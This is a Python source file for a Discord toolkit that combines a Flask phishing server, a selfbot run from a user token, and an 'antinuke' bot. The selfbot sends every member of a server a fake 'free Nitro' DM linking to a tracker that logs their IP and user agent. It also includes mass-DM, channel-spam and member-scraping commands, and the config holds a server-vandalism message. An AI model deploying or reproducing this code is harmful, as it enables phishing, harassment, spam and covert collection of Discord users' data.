# language: Python 3.13  |  file: main.py  |  runtime: single Railway service
# runs: discord bot (discord.py) + selfbot (discord.py-self) + flask phish server
#
# deps:
#   pip install discord.py flask aiohttp
#   pip install discord.py-self   ← for selfbot (install alongside discord.py)
#
# Railway start command: python main.py
#
# ── env vars (Railway → Variables) ───────────────────────────
#   TOKEN          = main bot token
#   SELF_TOKEN     = throwaway account user token (selfbot)
#   PHISH_URL      = https://your-service.up.railway.app
#   PHISH_KEY      = secret key for /logs route (default: lhsecret)
#   LOG_WEBHOOK_URL= discord webhook URL for logging (optional)
#   OWNER_ID       = your real Discord user ID (for selfbot DM reports)

import threading
import asyncio
import os
import sys
from typing import Optional

# ── selfbot runs on discord.py-self which conflicts with discord.py
# ── we import them in separate modules to avoid namespace collision
# ── flask starts first on its own thread, then selfbot thread, then main bot

# ─────────────────────────────────────────────────────────────
#  FLASK PHISH SERVER (inline — same as bot.py)
# ─────────────────────────────────────────────────────────────
import time
from flask import Flask, request, jsonify, redirect

flask_app  = Flask(__name__)
phish_logs = {}

PHISH_KEY = os.environ.get("PHISH_KEY", "lhsecret")
PHISH_URL = os.environ.get("PHISH_URL", "").rstrip("/")

@flask_app.route("/claim/<user_id>")
def claim(user_id):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    user_agent = request.headers.get("User-Agent", "unknown")
    ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
    phish_logs.setdefault(user_id, []).append({"ip": ip, "user_agent": user_agent, "timestamp": ts})
    # notify main bot owner — fired via shared queue below
    _phish_queue.put_nowait((user_id, ip, user_agent, ts))
    return redirect("https://discord.com/login", code=302)

@flask_app.route("/logs")
def logs_all():
    if request.args.get("key", "") != PHISH_KEY:
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(phish_logs)

@flask_app.route("/logs/<user_id>")
def logs_user(user_id):
    if request.args.get("key", "") != PHISH_KEY:
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(phish_logs.get(user_id, []))

@flask_app.route("/")
def index():
    return "<title>Discord</title><body style='background:#23272a'></body>", 200

import queue as _queue_module
_phish_queue = _queue_module.Queue()

def _run_flask():
    flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)


# ─────────────────────────────────────────────────────────────
#  SELFBOT (discord.py-self)
# ─────────────────────────────────────────────────────────────

SELF_TOKEN = os.environ.get("SELF_TOKEN", "")
OWNER_ID   = int(os.environ.get("OWNER_ID", "0"))
SB_PREFIX  = ">>"
DM_DELAY   = 1.2
SPAM_DELAY = 0.8

def _run_selfbot():
    """Runs in its own thread with its own event loop."""
    if not SELF_TOKEN or SELF_TOKEN == "YOUR_USER_TOKEN_HERE":
        print("[SB] SELF_TOKEN not set — selfbot disabled.")
        return

    try:
        import discord as _dself
    except ImportError:
        print("[SB] discord.py-self not installed — selfbot disabled.")
        return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    sb = _dself.Client()

    @sb.event
    async def on_ready():
        print(f"[SB] Logged in as {sb.user} | {len(sb.guilds)} servers")

    async def _reply(msg, text):
        try:
            m = await msg.channel.send(text)
            await asyncio.sleep(15)
            await m.delete()
        except Exception:
            pass

    async def _report(text):
        if OWNER_ID:
            try:
                u = await sb.fetch_user(OWNER_ID)
                await u.send(text)
            except Exception:
                pass

    @sb.event
    async def on_message(message):
        if message.author.id != sb.user.id:
            return
        if not message.content.startswith(SB_PREFIX):
            return
        try:
            await message.delete()
        except Exception:
            pass

        content = message.content[len(SB_PREFIX):].strip()
        parts   = content.split(" ", 1)
        cmd     = parts[0].lower()
        args    = parts[1] if len(parts) > 1 else ""

        if cmd == "ping":
            await _reply(message, f"🏓 {round(sb.latency * 1000)}ms")

        elif cmd == "help":
            await _reply(message, (
                "**LH Selfbot** (prefix: `>>`)\n"
                "`>>spy` `>>members <id>` `>>massdm <id> <msg>`\n"
                "`>>phish <id>` `>>spam <id> <ch> <n> <msg>`\n"
                "`>>join <code>` `>>leave <id>` `>>scrape <id>`\n"
                "`>>status <text>` `>>purge <n>` `>>ping`"
            ))

        elif cmd == "spy":
            if not sb.guilds:
                await _reply(message, "Not in any servers."); return
            lines = ["**Servers:**"]
            for g in sb.guilds:
                lines.append(f"`{g.id}` — **{g.name}** | {g.member_count} members")
            for chunk in ["\n".join(lines)[i:i+1900] for i in range(0, len("\n".join(lines)), 1900)]:
                await _report(chunk)
            await _reply(message, f"📡 Report sent to DMs. ({len(sb.guilds)} servers)")

        elif cmd == "members":
            if not args:
                await _reply(message, "Usage: `>>members <serverID>`"); return
            try: guild = sb.get_guild(int(args.strip()))
            except ValueError: await _reply(message, "Invalid ID."); return
            if not guild: await _reply(message, "Not in that server."); return
            lines = [f"Members — {guild.name}"]
            for m in guild.members:
                joined = m.joined_at.strftime("%Y-%m-%d") if m.joined_at else "?"
                lines.append(f"{m} | {m.id} | {joined} | bot={m.bot}")
            report = "\n".join(lines)
            for chunk in [report[i:i+1900] for i in range(0, len(report), 1900)]:
                await _report(f"```\n{chunk}\n```")
            await _reply(message, f"📋 Sent to DMs. ({len(guild.members)} members)")

        elif cmd == "massdm":
            sub = args.split(" ", 1)
            if len(sub) < 2: await _reply(message, "Usage: `>>massdm <id> <msg>`"); return
            try: guild = sb.get_guild(int(sub[0]))
            except ValueError: await _reply(message, "Invalid ID."); return
            if not guild: await _reply(message, "Not in that server."); return
            ok = 0; fail = 0
            await _reply(message, f"📨 Mass DM starting — {guild.name}...")
            for member in guild.members:
                if member.bot or member.id == sb.user.id: continue
                try:
                    await member.send(sub[1]); ok += 1
                    await asyncio.sleep(DM_DELAY)
                except Exception: fail += 1
            await _report(f"✅ Mass DM done — {guild.name}\nSent: {ok} | Failed: {fail}")

        elif cmd == "phish":
            if not args: await _reply(message, "Usage: `>>phish <id>`"); return
            if not PHISH_URL: await _reply(message, "❌ PHISH_URL not set."); return
            try: guild = sb.get_guild(int(args.strip()))
            except ValueError: await _reply(message, "Invalid ID."); return
            if not guild: await _reply(message, "Not in that server."); return
            ok = 0; fail = 0
            await _reply(message, f"🎣 Phish DM starting — {guild.name}...")
            for member in guild.members:
                if member.bot or member.id == sb.user.id: continue
                link = f"{PHISH_URL}/claim/{member.id}"
                try:
                    await member.send(
                        f"🎁 **You have a Discord Nitro gift waiting!**\n\n"
                        f"Someone sent you **3 months of Nitro** for free.\n"
                        f"Claim it here before it expires:\n{link}\n\n"
                        f"*Offer valid for 48 hours.*"
                    )
                    ok += 1
                    await asyncio.sleep(DM_DELAY)
                except Exception: fail += 1
            await _report(f"🎣 Phish done — {guild.name}\nSent: {ok} | Failed: {fail}")

        elif cmd == "spam":
            sub = args.split(" ", 3)
            if len(sub) < 4: await _reply(message, "Usage: `>>spam <serverID> <channelID> <count> <msg>`"); return
            try:
                guild   = sb.get_guild(int(sub[0]))
                channel = sb.get_channel(int(sub[1]))
                count   = max(1, min(int(sub[2]), 500))
                txt     = sub[3]
            except Exception: await _reply(message, "Invalid args."); return
            if not guild or not channel: await _reply(message, "Server/channel not found."); return
            sent = 0
            for _ in range(count):
                try:
                    await channel.send(txt); sent += 1
                    await asyncio.sleep(SPAM_DELAY)
                except Exception: break
            await _report(f"💬 Spam done — {sent}/{count} in #{channel.name} ({guild.name})")

        elif cmd == "join":
            if not args: await _reply(message, "Usage: `>>join <invite>`"); return
            code = args.strip().split("/")[-1]
            try:
                inv = await sb.fetch_invite(code)
                await inv.accept()
                await asyncio.sleep(2)
                await _reply(message, f"✅ Joined **{inv.guild.name}**")
                await _report(f"✅ Joined: **{inv.guild.name}** (`{inv.guild.id}`)")
            except Exception as e:
                await _reply(message, f"❌ Failed: `{e}`")

        elif cmd == "leave":
            if not args: await _reply(message, "Usage: `>>leave <id>`"); return
            try: guild = sb.get_guild(int(args.strip()))
            except ValueError: await _reply(message, "Invalid ID."); return
            if not guild: await _reply(message, "Not in that server."); return
            name = guild.name
            try:
                await guild.leave()
                await _reply(message, f"✅ Left **{name}**")
            except Exception as e:
                await _reply(message, f"❌ Failed: `{e}`")

        elif cmd == "scrape":
            if not args: await _reply(message, "Usage: `>>scrape <id>`"); return
            try: guild = sb.get_guild(int(args.strip()))
            except ValueError: await _reply(message, "Invalid ID."); return
            if not guild: await _reply(message, "Not in that server."); return
            lines = [
                f"**{guild.name}** (`{guild.id}`)",
                f"Owner: `{guild.owner_id}` | Members: {guild.member_count}",
                f"Channels: {len(guild.channels)} | Roles: {len(guild.roles)}",
                f"Boost: {guild.premium_tier} | Created: {guild.created_at.strftime('%Y-%m-%d')}",
                "", "**Roles:**",
            ]
            for r in sorted(guild.roles, key=lambda r: r.position, reverse=True):
                if not r.is_default():
                    lines.append(f"  `{r.id}` {r.name} ({len(r.members)} members)")
            lines.append("\n**Channels:**")
            for ch in guild.text_channels:
                lines.append(f"  `{ch.id}` #{ch.name}")
            report = "\n".join(lines)
            for chunk in [report[i:i+1900] for i in range(0, len(report), 1900)]:
                await _report(chunk)
            await _reply(message, "📊 Scrape sent to DMs.")

        elif cmd == "status":
            if not args: await _reply(message, "Usage: `>>status <text>`"); return
            try:
                await sb.change_presence(activity=_dself.CustomActivity(name=args))
                await _reply(message, f"✅ Status: `{args}`")
            except Exception as e:
                await _reply(message, f"❌ `{e}`")

        elif cmd == "purge":
            if not args: await _reply(message, "Usage: `>>purge <n>`"); return
            try: count = max(1, min(int(args.strip()), 100))
            except ValueError: await _reply(message, "Invalid number."); return
            deleted = 0
            async for msg in message.channel.history(limit=200):
                if msg.author.id == sb.user.id:
                    try:
                        await msg.delete(); deleted += 1
                        await asyncio.sleep(0.3)
                    except Exception: pass
                if deleted >= count: break
            await _reply(message, f"🗑️ Deleted {deleted} messages.")

    loop.run_until_complete(sb.start(SELF_TOKEN))


# ─────────────────────────────────────────────────────────────
#  MAIN BOT (discord.py)
# ─────────────────────────────────────────────────────────────

import discord
from discord.ext import commands
from discord import app_commands
import secrets
import string
import re
import aiohttp
from collections import defaultdict

TOKEN           = os.environ.get("TOKEN")
VERIFY_ROLE_NAME  = "Verified"
LOG_CHANNEL_NAME  = "lh-antinuke-logs"
LOG_ROLE_NAME     = "LH Security"
PREMIUM_USER_ID   = 1224012443341160498
LOG_WEBHOOK_URL   = os.environ.get("LOG_WEBHOOK_URL", "")

ANTINUKE_IDS = {
    159985870458322944, 155149108183695360, 235088799074484224,
    395087306962165763, 282859044593598464, 429457053791158281,
    573030148151189514, 496683369965781012, 715202395568095232,
    489977906714509312, 505527697351696395,
}

nuke_config = {
    "channel_name": "hooked by lh clan",
    "message":      "lol ur server doesn't even have any good protection get a job",
    "channel_count": 12,
    "spam_count":    100,
}

active_tokens: dict[str, dict] = {}
premium_users: dict[int, float] = {PREMIUM_USER_ID: float("inf")}
antinuke_enabled:   dict[int, bool] = defaultdict(lambda: True)
antinuke_whitelist: dict[int, set]  = defaultdict(set)
action_log: dict[int, dict[int, list]] = defaultdict(lambda: defaultdict(list))
role_snapshots:    dict[int, dict[int, dict]] = defaultdict(dict)
channel_snapshots: dict[int, dict[int, dict]] = defaultdict(dict)
restore_cooldown:  dict[int, float]           = defaultdict(float)
RESTORE_COOLDOWN_SECS = 10
suspicious_log: dict[int, dict[int, dict]] = defaultdict(lambda: defaultdict(lambda: defaultdict(int)))
SUSPICIOUS_ALERT_AT = 2
dm_tunnels: dict[int, int] = {}

THRESHOLDS = {
    "channel_delete": (3, 5), "channel_create": (3, 5),
    "role_delete":    (3, 5), "kick":           (3, 5),
    "ban":            (2, 5), "webhook_create": (2, 10),
    "role_update":    (3, 5),
}

DISCORD_TOKEN_REGEX = re.compile(
    r"[MNO][a-zA-Z0-9_-]{23,25}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"
)

intents = discord.Intents.default()
intents.members         = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ── token helpers ─────────────────────────────────────────────

def _gen_token_str() -> str:
    return "LHT-" + "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(24))

def create_token(created_by: int, uses=None, duration_secs=None, label="") -> str:
    tok = _gen_token_str()
    active_tokens[tok] = {
        "uses_left": uses, "expires_at": (time.time() + duration_secs) if duration_secs else None,
        "created_at": time.time(), "created_by": created_by, "label": label,
    }
    return tok

def validate_token(tok: str) -> tuple[bool, str]:
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data: return False, "Token does not exist."
    if data["expires_at"] and time.time() > data["expires_at"]:
        active_tokens.pop(tok, None); return False, "Token has expired."
    if data["uses_left"] is not None:
        if data["uses_left"] <= 0:
            active_tokens.pop(tok, None); return False, "Token has no uses remaining."
        data["uses_left"] -= 1
        if data["uses_left"] <= 0: active_tokens.pop(tok, None)
    return True, "ok"

def _peek_token(tok: str) -> tuple[bool, str]:
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data: return False, "Token does not exist."
    if data["expires_at"] and time.time() > data["expires_at"]:
        active_tokens.pop(tok, None); return False, "Token has expired."
    if data["uses_left"] is not None and data["uses_left"] <= 0:
        active_tokens.pop(tok, None); return False, "Token has no uses remaining."
    return True, "ok"

def token_info_str(tok: str, data: dict) -> str:
    label = f" `{data['label']}`" if data["label"] else ""
    uses  = f"{data['uses_left']} uses left" if data["uses_left"] is not None else "unlimited uses"
    if not data["expires_at"]: exp = "never expires"
    else:
        rem = data["expires_at"] - time.time()
        if rem <= 0: exp = "expired"
        else:
            d,h,m = int(rem//86400), int((rem%86400)//3600), int((rem%3600)//60)
            parts = ([f"{d}d"] if d else []) + ([f"{h}h"] if h else []) + ([f"{m}m"] if m else [])
            exp = "expires in " + (" ".join(parts) if parts else "< 1m")
    return f"`{tok}`{label} — {uses}, {exp}"

def is_premium(user_id: int) -> bool:
    expiry = premium_users.get(user_id)
    if expiry is None: return False
    if expiry == float("inf"): return True
    if time.time() < expiry: return True
    premium_users.pop(user_id, None); return False

def premium_expiry_str(user_id: int) -> str:
    expiry = premium_users.get(user_id)
    if expiry is None: return "No access"
    if expiry == float("inf"): return "Permanent"
    rem = expiry - time.time()
    if rem <= 0: return "Expired"
    d,h,m = int(rem//86400), int((rem%86400)//3600), int((rem%3600)//60)
    parts = ([f"{d}d"] if d else []) + ([f"{h}h"] if h else []) + ([f"{m}m"] if m else [])
    return " ".join(parts) if parts else "< 1m"

def parse_duration(s: str):
    s = s.strip().lower()
    if s == "permanent": return float("inf")
    units = {"d": 86400, "h": 3600, "m": 60, "s": 1}
    if s and s[-1] in units:
        try: return float(s[:-1]) * units[s[-1]]
        except ValueError: return None
    return None

def check_threshold(guild_id, user_id, action) -> bool:
    max_a, within = THRESHOLDS.get(action, (5, 10))
    now = time.time()
    log = action_log[guild_id][user_id]
    log.append((action, now))
    action_log[guild_id][user_id] = [(a,t) for a,t in log if now-t <= within]
    return sum(1 for a,t in action_log[guild_id][user_id] if a == action) >= max_a

# ── webhook + notify ──────────────────────────────────────────

def _embed_to_dict(embed: discord.Embed) -> dict:
    d: dict = {}
    if embed.title:       d["title"]       = embed.title
    if embed.description: d["description"] = embed.description
    if embed.color:       d["color"]       = embed.color.value
    if embed.timestamp:   d["timestamp"]   = embed.timestamp.isoformat()
    if embed.footer.text: d["footer"]      = {"text": embed.footer.text}
    if embed.author.name: d["author"]      = {"name": embed.author.name}
    if embed.thumbnail.url: d["thumbnail"] = {"url": embed.thumbnail.url}
    if embed.fields:
        d["fields"] = [{"name": f.name, "value": f.value, "inline": f.inline} for f in embed.fields]
    return d

async def _webhook_log(embed: discord.Embed):
    if not LOG_WEBHOOK_URL: return
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(LOG_WEBHOOK_URL, json={"embeds": [_embed_to_dict(embed)]})
    except Exception: pass

async def notify_owner(embed: discord.Embed):
    try:
        owner = await bot.fetch_user(PREMIUM_USER_ID)
        await owner.send(embed=embed)
    except Exception: pass
    await _webhook_log(embed)

async def get_or_create_log_channel(guild):
    sec_role = discord.utils.get(guild.roles, name=LOG_ROLE_NAME)
    if not sec_role:
        try: sec_role = await guild.create_role(name=LOG_ROLE_NAME, color=discord.Color.red(), hoist=True, reason="LH AntiNuke")
        except Exception: sec_role = None
    log_ch = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_ch: return log_ch
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, embed_links=True),
    }
    if sec_role: overwrites[sec_role] = discord.PermissionOverwrite(view_channel=True, send_messages=False)
    try:
        cat = discord.utils.get(guild.categories, name="🔒 LH Security")
        if not cat:
            cat_ow = {guild.default_role: discord.PermissionOverwrite(view_channel=False), guild.me: discord.PermissionOverwrite(view_channel=True)}
            if sec_role: cat_ow[sec_role] = discord.PermissionOverwrite(view_channel=True)
            cat = await guild.create_category("🔒 LH Security", overwrites=cat_ow, reason="LH AntiNuke")
        return await guild.create_text_channel(LOG_CHANNEL_NAME, category=cat, overwrites=overwrites, reason="LH AntiNuke")
    except Exception: return None

async def log_antinuke_event(guild, embed):
    log_ch = await get_or_create_log_channel(guild)
    if log_ch:
        try: await log_ch.send(embed=embed)
        except Exception: pass
    await notify_owner(embed)

async def antinuke_punish(guild, member, reason):
    try: await guild.ban(member, reason=f"[AntiNuke] {reason}", delete_message_days=0); action = "Banned"
    except Exception:
        try: await member.kick(reason=f"[AntiNuke] {reason}"); action = "Kicked"
        except Exception: action = "Failed"
    embed = discord.Embed(title="🛡️ AntiNuke — Threat Neutralized", color=0xff0000, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
    embed.add_field(name="User",   value=f"{member} (`{member.id}`)",    inline=False)
    embed.add_field(name="Action", value=action,                         inline=True)
    embed.add_field(name="Reason", value=reason,                         inline=False)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="LH AntiNuke System")
    await log_antinuke_event(guild, embed)

async def send_suspicious_alert(guild, user, action, count):
    embed = discord.Embed(title="👁️ AntiNuke — Suspicious Activity", color=0xff9900, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
    embed.add_field(name="User",   value=f"{user} (`{user.id}`)",        inline=False)
    embed.add_field(name="Action", value=action.replace("_"," ").title(),inline=True)
    embed.add_field(name="Count",  value=str(count),                     inline=True)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.set_footer(text="LH AntiNuke — Audit Watcher")
    log_ch = await get_or_create_log_channel(guild)
    if log_ch:
        try: await log_ch.send(embed=embed)
        except Exception: pass
    await notify_owner(embed)

# ── phish queue processor ─────────────────────────────────────

async def _process_phish_queue():
    while True:
        try:
            user_id, ip, ua, ts = _phish_queue.get_nowait()
            embed = discord.Embed(title="🎣 Phish Hit!", color=0x00ff00, timestamp=discord.utils.utcnow())
            embed.add_field(name="Target ID",  value=f"`{user_id}`",   inline=False)
            embed.add_field(name="IP Address", value=f"`{ip}`",         inline=True)
            embed.add_field(name="Time",       value=ts,                inline=True)
            embed.add_field(name="User Agent", value=f"`{ua[:200]}`",   inline=False)
            embed.set_footer(text="LH Phish System")
            await notify_owner(embed)
        except _queue_module.Empty:
            pass
        await asyncio.sleep(1)

# ── snapshots ─────────────────────────────────────────────────

def snapshot_roles(guild):
    role_snapshots[guild.id] = {}
    for role in guild.roles:
        if role.is_default(): continue
        role_snapshots[guild.id][role.id] = {
            "name": role.name, "color": role.color.value, "permissions": role.permissions.value,
            "hoist": role.hoist, "mentionable": role.mentionable, "position": role.position,
        }

def snapshot_channels(guild):
    channel_snapshots[guild.id] = {}
    for ch in guild.channels:
        if not isinstance(ch, discord.TextChannel): continue
        overwrites = {}
        for target, ow in ch.overwrites.items():
            key = f"role:{target.id}" if isinstance(target, discord.Role) else f"member:{target.id}"
            allow, deny = ow.pair()
            overwrites[key] = {"allow": allow.value, "deny": deny.value}
        channel_snapshots[guild.id][ch.id] = {
            "name": ch.name, "topic": ch.topic or "", "position": ch.position,
            "category_id": ch.category_id, "overwrites": overwrites,
        }

async def restore_role(guild, role_id):
    snap = role_snapshots[guild.id].get(role_id)
    if not snap or snap["name"] == LOG_ROLE_NAME: return
    try:
        new_role = await guild.create_role(
            name=snap["name"], color=discord.Color(snap["color"]),
            permissions=discord.Permissions(snap["permissions"]),
            hoist=snap["hoist"], mentionable=snap["mentionable"], reason="[AntiNuke] Restored"
        )
        try: await new_role.edit(position=snap["position"])
        except Exception: pass
    except Exception: pass

async def restore_channel(guild, channel_id):
    snap = channel_snapshots[guild.id].get(channel_id)
    if not snap or snap["name"] == LOG_CHANNEL_NAME: return
    try:
        overwrites = {}
        for key, val in snap["overwrites"].items():
            kind, oid = key.split(":")
            oid = int(oid)
            ow = discord.PermissionOverwrite.from_pair(discord.Permissions(val["allow"]), discord.Permissions(val["deny"]))
            target = guild.get_role(oid) if kind == "role" else guild.get_member(oid)
            if target: overwrites[target] = ow
        category = guild.get_channel(snap["category_id"]) if snap["category_id"] else None
        await guild.create_text_channel(name=snap["name"], topic=snap["topic"] or None, category=category, overwrites=overwrites, reason="[AntiNuke] Restored")
    except Exception: pass

# ══════════════════════════════════════════════════════════════
#  DM TUNNEL
# ══════════════════════════════════════════════════════════════

class TunnelReplyModal(discord.ui.Modal, title="💬 Reply"):
    reply_text = discord.ui.TextInput(label="Your Message", placeholder="Type your reply...", required=True, max_length=2000, style=discord.TextStyle.paragraph)

    def __init__(self, target_id: int):
        super().__init__()
        self.target_id = target_id

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        owner_id = dm_tunnels.get(self.target_id)
        if owner_id is None:
            await interaction.followup.send("❌ Conversation closed.", ephemeral=True); return
        embed = discord.Embed(title="📨 Tunnel Reply Received", description=self.reply_text.value, color=0x5865f2, timestamp=discord.utils.utcnow())
        embed.set_author(name=str(interaction.user), icon_url=interaction.user.display_avatar.url)
        embed.set_footer(text=f"User ID: {interaction.user.id}")
        try:
            owner = await bot.fetch_user(owner_id)
            await owner.send(embed=embed)
        except Exception: pass
        await _webhook_log(embed)
        await interaction.followup.send(embed=discord.Embed(title="✅ Reply Sent", description="Your message has been delivered.", color=0x00ff00), ephemeral=True)

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        try: await interaction.followup.send("❌ Something went wrong.", ephemeral=True)
        except Exception: pass

class TunnelMessageView(discord.ui.View):
    def __init__(self, target_id: int):
        super().__init__(timeout=None)
        self.target_id = target_id

    @discord.ui.button(label="Reply", emoji="💬", style=discord.ButtonStyle.blurple, custom_id="tunnel_reply")
    async def reply_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.target_id:
            await interaction.response.send_message("❌ Not for you.", ephemeral=True); return
        if self.target_id not in dm_tunnels:
            await interaction.response.send_message("❌ Conversation closed.", ephemeral=True); return
        await interaction.response.send_modal(TunnelReplyModal(self.target_id))

@bot.command(name="dmt")
async def dmt(ctx, user_id: str = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not user_id or not message: await ctx.send("❌ Usage: `!dmt <userID> <message>`", delete_after=5); return
    try: target_id = int(user_id); target = await bot.fetch_user(target_id)
    except Exception: await ctx.send("❌ User not found.", delete_after=5); return
    dm_tunnels[target_id] = ctx.author.id
    embed = discord.Embed(title="📬 New Message", description=message, color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_footer(text="Click Reply to respond • LH Messaging")
    try:
        await target.send(embed=embed, view=TunnelMessageView(target_id))
    except discord.Forbidden:
        dm_tunnels.pop(target_id, None); await ctx.send("❌ Cannot DM that user.", delete_after=5); return
    confirm = discord.Embed(title="✅ Tunnel DM Sent", color=0x00ff00)
    confirm.add_field(name="Target", value=f"{target} (`{target_id}`)", inline=False)
    confirm.add_field(name="Message", value=message[:200], inline=False)
    try: await ctx.author.send(embed=confirm); await ctx.send("✅ Sent — check DMs.", delete_after=5)
    except Exception: await ctx.send(embed=confirm, delete_after=10)

@bot.command(name="dmtreply")
async def dmt_reply(ctx, user_id: str = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not user_id or not message: await ctx.send("❌ Usage: `!dmtreply <userID> <message>`", delete_after=5); return
    try: target_id = int(user_id); target = await bot.fetch_user(target_id)
    except Exception: await ctx.send("❌ User not found.", delete_after=5); return
    if target_id not in dm_tunnels or dm_tunnels[target_id] != ctx.author.id:
        await ctx.send("❌ No open tunnel to that user.", delete_after=5); return
    embed = discord.Embed(title="📬 New Message", description=message, color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_footer(text="Click Reply to respond • LH Messaging")
    try: await target.send(embed=embed, view=TunnelMessageView(target_id)); await ctx.send("✅ Follow-up sent.", delete_after=5)
    except discord.Forbidden: await ctx.send("❌ Cannot DM that user.", delete_after=5)

@bot.command(name="dmtclose")
async def dmt_close(ctx, user_id: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not user_id: await ctx.send("❌ Usage: `!dmtclose <userID>`", delete_after=5); return
    try: target_id = int(user_id)
    except ValueError: await ctx.send("❌ Invalid ID.", delete_after=5); return
    if target_id not in dm_tunnels: await ctx.send("❌ No tunnel for that user.", delete_after=5); return
    dm_tunnels.pop(target_id, None)
    try:
        target = await bot.fetch_user(target_id)
        await target.send(embed=discord.Embed(title="🔒 Conversation Closed", description="This conversation has ended.", color=0xff9900))
    except Exception: pass
    await ctx.send(f"✅ Tunnel closed.", delete_after=5)

@bot.command(name="dmtlist")
async def dmt_list(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=5); return
    embed = discord.Embed(title="📋 Active Tunnels", color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.description = "\n".join(f"Target: `{t}` → Owner: `{o}`" for t,o in dm_tunnels.items()) or "No tunnels open."
    embed.set_footer(text=f"Total: {len(dm_tunnels)}")
    try: await ctx.author.send(embed=embed); await ctx.send("📋 Sent to DMs.", delete_after=5)
    except Exception: await ctx.send(embed=embed, delete_after=15)

# ══════════════════════════════════════════════════════════════
#  BOT EVENTS
# ══════════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    for guild in bot.guilds:
        snapshot_roles(guild); snapshot_channels(guild)
    bot.loop.create_task(_process_phish_queue())
    try: await bot.tree.sync(); print(f"[BOT] Slash commands synced")
    except Exception as e: print(f"[BOT] Slash sync failed: {e}")
    print(f"[BOT] {bot.user} online — {len(bot.guilds)} servers")

@bot.event
async def on_guild_join(guild):
    snapshot_roles(guild); snapshot_channels(guild); antinuke_enabled[guild.id] = True

@bot.event
async def on_guild_role_delete(role):
    guild = role.guild
    if not antinuke_enabled.get(guild.id, True): return
    now = time.time()
    if now - restore_cooldown[guild.id] < RESTORE_COOLDOWN_SECS: return
    restore_cooldown[guild.id] = now
    asyncio.create_task(restore_role(guild, role.id))
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        user = entry.user
        if user.id in antinuke_whitelist[guild.id] or user.id == bot.user.id: return
        if check_threshold(guild.id, user.id, "role_delete"):
            member = guild.get_member(user.id)
            if member: await antinuke_punish(guild, member, "Mass role deletion detected")

@bot.event
async def on_guild_channel_delete(channel):
    guild = channel.guild
    if not antinuke_enabled.get(guild.id, True): return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        user = entry.user
        if user.id in antinuke_whitelist[guild.id] or user.id == bot.user.id: return
        if check_threshold(guild.id, user.id, "channel_delete"):
            member = guild.get_member(user.id)
            if member: await antinuke_punish(guild, member, "Mass channel deletion detected")
    now = time.time()
    if now - restore_cooldown[guild.id] >= RESTORE_COOLDOWN_SECS:
        restore_cooldown[guild.id] = now
        if isinstance(channel, discord.TextChannel):
            asyncio.create_task(restore_channel(guild, channel.id))

@bot.event
async def on_member_ban(guild, user):
    if not antinuke_enabled.get(guild.id, True): return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        actor = entry.user
        if actor.id in antinuke_whitelist[guild.id] or actor.id == bot.user.id: return
        if check_threshold(guild.id, actor.id, "ban"):
            member = guild.get_member(actor.id)
            if member: await antinuke_punish(guild, member, "Mass ban detected")

@bot.event
async def on_member_remove(member):
    guild = member.guild
    if not antinuke_enabled.get(guild.id, True): return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
        if entry.target.id != member.id: continue
        actor = entry.user
        if actor.id in antinuke_whitelist[guild.id] or actor.id == bot.user.id: return
        if check_threshold(guild.id, actor.id, "kick"):
            kicker = guild.get_member(actor.id)
            if kicker: await antinuke_punish(guild, kicker, "Mass kick detected")

@bot.event
async def on_guild_role_update(before, after):
    guild = before.guild
    if not antinuke_enabled.get(guild.id, True): return
    danger = discord.Permissions(administrator=True) | discord.Permissions(manage_guild=True) | discord.Permissions(ban_members=True)
    if not (after.permissions.value & danger.value): return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_update):
        actor = entry.user
        if actor.id in antinuke_whitelist[guild.id] or actor.id == bot.user.id: return
        if check_threshold(guild.id, actor.id, "role_update"):
            member = guild.get_member(actor.id)
            if member: await antinuke_punish(guild, member, "Dangerous role permission escalation")

@bot.event
async def on_audit_log_entry_create(entry):
    guild = entry.guild
    if not antinuke_enabled.get(guild.id, True): return
    actor = entry.user
    if not actor or actor.id == bot.user.id or actor.id in antinuke_whitelist[guild.id]: return
    action_map = {
        discord.AuditLogAction.channel_delete: "channel_delete",
